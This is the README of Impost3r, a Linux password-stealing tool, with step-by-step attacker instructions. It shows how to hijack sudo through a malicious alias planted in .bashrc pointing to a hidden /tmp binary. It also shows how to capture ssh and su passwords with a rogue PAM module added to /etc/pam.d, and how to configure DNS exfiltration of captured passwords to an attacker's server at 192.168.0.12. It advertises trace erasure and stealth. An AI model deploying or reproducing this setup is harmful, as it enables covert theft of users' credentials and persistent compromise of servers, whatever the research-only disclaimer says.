![imposter.png](https://github.com/ph4ntonn/Impost3r/blob/master/img/Impost3r.png)

# Impost3r

[![GitHub issues](https://img.shields.io/github/issues/ph4ntonn/Impost3r)](https://github.com/ph4ntonn/Impost3r/issues)
[![GitHub stars](https://img.shields.io/github/stars/ph4ntonn/Impost3r)](https://github.com/ph4ntonn/Impost3r/stargazers)
[![GitHub forks](https://img.shields.io/github/forks/ph4ntonn/Impost3r)](https://github.com/ph4ntonn/Impost3r/network)
[![GitHub license](https://img.shields.io/github/license/ph4ntonn/Impost3r?label=license)](https://github.com/ph4ntonn/Impost3r/blob/master/LICENSE)

[English](README_EN.md)

Impost3r是一个利用C语言编写,用来窃取linux下各类密码(ssh,su,sudo)的工具

用户可使用此程序制造水坑，窃取合法用户的密码

> 此工具仅限于安全研究和教学，用户承担因使用此工具而导致的所有法律和相关责任！ 作者不承担任何法律和相关责任！

## 特性

- 自动擦除行为痕迹
- 通过DNS协议传输结果
- 用户无感

## 依赖

- gcc

## 使用方法

Impost3r可以用来窃取包括sudo、su、ssh服务在内的密码，这三个服务可大致分为2类，sudo以及ssh/su，下面分两种情况讨论

## 窃取sudo密码

仅需要普通用户权限即可，不要求一定是root，但只能窃取对应用户的密码，不能窃取其他用户的

- 首先假设攻击者控制了一台服务器，权限为普通用户权限

- 检查用户根目录下是否存在```.bash_profile```文件，如果```.bash_profile```存在:检查```.bash_profile```文件中是否主动加载了```.bashrc```，如果主动加载，则跳过此步骤及下两步检查，继续进行之后的操作,如果未主动加载,那么跳过下两步检查,且**下文中所有针对```.bashrc```的操作全部更换为针对```.bash_profile```的操作!!!**;如果```.bash_profile```不存在: 进行下一步检查。

- 检查用户根目录下是否存在```.bash_login```文件，如果```.bash_login```存在:检查```.bash_login```文件中是否主动加载了```.bashrc```，如果主动加载，则跳过此步骤及下一步检查，继续进行之后的操作,如果未主动加载,那么跳过下一步检查,且**下文中所有针对```.bashrc```的操作全部更换为针对```.bash_login```的操作!!!**;如果```.bash_login```不存在: 进行下一步检查。 

- 检查用户根目录下是否存在```.profile```文件，如果存在```.profile```文件:检查```.profile```文件中是否主动加载了```.bashrc```(默认情况下加载)，如果主动加载，则跳过此步骤，继续进行之后的操作,如果未主动加载,那么**下文中所有针对```.bashrc```的操作全部更换为针对```.profile```的操作!!!**;如果```.profile```也不存在，原则上Impost3r将无法使用，当然你也可以视情况自己决定是否生成```.bash_profile```或者```.profile```文件，并往其中写入类似如下的加载代码来加载```.bashrc```

```
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
	. "$HOME/.bashrc"
    fi
fi
```

- 拷贝一份用户的```.bashrc```:```cp ～/.bashrc /tmp/```，并将这份副本放在攻击者自定义的路径下(本例中放置在/tmp/目录下，攻击者可以修改)

- 修改用户根目录下的```.bashrc```(～/.bashrc)，在最后一行添加如下语句(其中“/tmp/.impost3r”需要与下面的FILENAME保持一致)：

```
alias sudo='impost3r() {
if [ -f "/tmp/.impost3r" ]; then
/tmp/.impost3r "$@" && unalias sudo
else
unalias sudo;sudo "$@"
fi
}; impost3r'
```

- 添加完成后，保存文件并执行```source ~/.bashrc```

- 接着攻击者需要对Impost3r源代码```/sudo/main.h```进行修改：

```
/*
    Custom setting
*/
# define FILENAME "/tmp/.impost3r" \\设置Impost3r在目标服务器上的位置
# define BACKUP_ORI_FILENAME ".bashrc" \\表明攻击者所备份的源用户配置文件是.bashrc还是.bash_profile、.profile、.bash_login
# define BACKUP_ORI_PATH "/tmp/.bashrc" \\表明攻击者所备份的源用户配置文件在目标服务器上的位置
# define SAVE_OR_SEND 0 \\设置在窃取成功后是将结果保存在目标机器上或者是发送至攻击者控制的机器(发送=0，保存=1，默认为发送)

/*
    Send to server
*/
# define YOUR_DOMAIN ".com" \\注意，如果你不想购买一个域名来接收Impost3r回传的消息且被植入Impost3r的目标服务器并未禁止向你所控制的dns服务器的53端口的直接udp连接，那么这里的域名请使用默认值;
\\但是如果被植入Impost3r的目标服务器严格限制了dns请求的出站，那么请将YOUR_DOMAIN的值改为你所购买的域名，例如“.example.com”，并将这个域名的NS记录配置成你所控制的DNS服务器地址，在此DNS服务器上运行Fdns,并将下方REMOTE_ADDRESS的值更改为被植入Impost3r的目标服务器的默认dns地址,REMOTE_PORT更改为被植入Impost3r的目标服务器的默认dns地址所监听的dns服务端口(绝大多数情况下都是53端口)
# define MAX_RESEND 30 \\设置当窃取到密码之后，Impost3r向攻击者服务器发送用户密码的最大重试次数
# define RESEND_INTERVAL 5 \\设置每一次发送密码的间隔
# define REMOTE_ADDRESS "192.168.0.12" \\设置回送密码的远程地址
# define REMOTE_PORT 53 \\设置回送密码的远程端口

/*
    Save to local
*/
# define SAVE_LOCATION "/tmp/.cache" \\设置结果文件保存的位置，在SAVE_OR_SEND设置为1的情况下
```
- 修改完成后，保存并在当前目录执行```make```

- 在当前目录下得到编译完成的```.impost3r```文件

- 上传(尽量在目标服务器编译，防止产生非预期的错误)```.impost3r```文件至目标服务器的```/tmp/```文件夹下(仅为示例，可自行修改，只需与源代码中定义相同即可)

- 攻击者在自己的服务器上启动dns服务端程序，等待合法用户使用```sudo```后获取密码。

### 窃取效果

<img src="https://user-images.githubusercontent.com/45198234/83479347-e88b1700-a4ca-11ea-8230-8ec7e9a66845.gif" width="1200" >

### Tips

- 在窃取sudo密码的情况下，Impost3r在成功后将会自动擦除痕迹，并不需要攻击者上去手动清理

- Impost3r会自动判别用户输入的密码是否是正确密码，直到用户输入正确密码后才结束流程并擦除痕迹

- 请在使用Impost3r之前自行使用```sudo -v```判断当前用户是否在```sudoer```组，如果不在，切勿使用Impost3r

## 窃取ssh/su密码

窃取ssh/su密码与上面sudo密码的窃取利用方法不同，要求必须是root权限,可以窃取任意用户密码

以下以Ubuntu为例，Centos类似，使用的文件和修改文件的方式可能有所不同

- 首先还是假设攻击者控制了一台服务器

- 通过一顿提权操作获得了root权限（或者可爱的管理员就是用root权限启动的服务）

- 先编辑Impost3r的```/ssh_su/main.h```源代码文件

```
/*
    Custom setting
*/
# define SSH_OR_BOTH 0 \\设置偷取模式，0代表仅偷取ssh密码，1代表偷取ssh及su密码，默认为0（后面会讲到区别）
# define SAVE_OR_SEND 0 \\设置在窃取成功后是将结果保存在目标机器上或者是发送至攻击者控制的机器(发送=0，保存=1，默认为发送)

/*
    Send to server
*/
# define YOUR_DOMAIN ".com" \\注意，如果你不想购买一个域名来接收Impost3r回传的消息且被植入Impost3r的目标服务器并未禁止向你所控制的dns服务器的53端口的直接udp连接，那么这里的域名请使用默认值;
\\但是如果被植入Impost3r的目标服务器严格限制了dns请求的出站，那么请将YOUR_DOMAIN的值改为你所购买的域名，例如“.example.com”，并将这个域名的NS记录配置成你所控制的DNS服务器地址，在此DNS服务器上运行Fdns,并将下方REMOTE_ADDRESS的值更改为被植入Impost3r的目标服务器的默认dns地址,REMOTE_PORT更改为被植入Impost3r的目标服务器的默认dns地址所监听的dns服务端口(绝大多数情况下都是53端口)
# define MAX_RESEND 30 \\设置当窃取到密码之后，Impost3r向攻击者服务器发送用户密码的最大重试次数(仅当SSH_OR_BOTH为0，此选项才有效)
# define RESEND_INTERVAL 5 \\设置每一次发送密码的间隔(仅当SSH_OR_BOTH为0，此选项才有效)
# define REMOTE_ADDRESS "192.168.0.12" \\设置回送密码的远程地址
# define REMOTE_PORT 53 \\设置回送密码的远程端口

/*
    Save to local
*/
# define SAVE_LOCATION "/tmp/.sshsucache" \\设置结果文件保存的位置，在SAVE_OR_SEND设置为1的情况下
```

- 修改完成后，保存并在当前目录下执行```make```

- 得到编译好的文件```impost3r.so```

- 将编译完成的```impost3r.so```上传(尽量在目标服务器编译，防止产生非预期的错误)至目标机器的```/lib/x86_64-linux-gnu/security```下(不同机器可能文件夹名不同，请根据情况放置)

- 进入```/etc/pam.d```下，这时分两种情况，如果选择的模式是仅偷取ssh密码，那么就需要执行```vi sshd```,在文件的最后添加如下语句(这里需要注意，除Ubuntu外类似Centos的此文件可能相较于Ubuntu存在较大差异，建议自行读懂规则后再进行添加)

```
auth optional impost3r.so
account optional impost3r.so
```

- 保存并退出，重启sshd服务```service sshd restart```

- 而如果选择的是ssh和su密码一起偷取，那么就需要执行```vi common-auth```，添加相同语句，保存并退出后同样重启sshd服务

- 攻击者在自己的服务器上启动dns服务端程序，等待合法用户使用```ssh```登陆目标机器或者使用```su```切换用户后获取密码。

### 窃取效果

<img src="https://user-images.githubusercontent.com/45198234/83846859-d7960c00-a73d-11ea-81f2-5ec5a912a28d.gif" width="1200" >

### Tips

- 在窃取ssh/su密码的情况下，Impost3r由于权限原因无法清除痕迹，需要攻击者自己去清除

- 请注意，如果设置仅窃取ssh密码，那么基本可以保证攻击者能百分百收到窃取结果，而如果设置两者同时窃取，则不一定保证攻击者能百分百收到结果(仅当设置为dns发送的时候，设置为本地保存不受影响)

- 不推荐窃取su密码，而且由于用户的ssh密码与su密码是相同的，故而能不窃取su密码就不要窃取，ssh密码就足矣

- 默认不窃取空密码，请自行尝试用户是否存在空密码(检查一下sshd的配置文件中是否有```PermitEmptyPasswords yes```,如果是空，那还窃取个鬼鬼。)

## 注意事项

- Dns服务端程序我使用的是[Fdns](https://github.com/deepdarkness/Fdns)，并修改了一部分参数，大家可在文件夹Fdns下找到修改后的源代码，请自行利用命令```gcc -o dns main.c util.c```编译(注意要先修改main.c中的监听端口)
- 在编译Fdns之前,请查看```util.h```中的```YOUR_DOMAIN```值，确保此值与被植入服务器上的Impost3r程序所编译时使用的```YOUR_DOMAIN```值是一致的，不然可能会导致窃取的失败
- 此程序仅是闲暇时开发学习，功能可能存在bug，请多多谅解，也欢迎反馈问题

## 致谢

- [Fdns](https://github.com/deepdarkness/Fdns)
- [libbaseencode](https://github.com/paolostivanin/libbaseencode) 
